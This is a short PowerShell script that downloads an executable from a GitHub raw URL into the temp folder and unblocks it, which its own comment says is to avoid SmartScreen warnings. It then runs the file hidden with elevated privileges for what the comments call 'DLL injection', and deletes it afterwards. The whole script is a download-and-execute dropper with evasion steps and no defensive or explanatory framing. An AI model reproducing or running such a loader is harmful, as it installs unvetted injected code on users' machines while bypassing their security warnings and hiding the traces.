# 1. Correct GitHub raw link
$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/consolehistory/main/ConsoleApplication6.exe"
$tempPath = "$env:TEMP\ConsoleApplication6.exe"

# 2. Download EXE from GitHub
Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing

# 3. Unblock (prevent SmartScreen warning)
Unblock-File -Path $tempPath

# 4. Run the EXE with elevated privileges (DLL injection), then wait
$proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb RunAs -PassThru
$proc.WaitForExit()

# 5. Delete the EXE after injection
Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
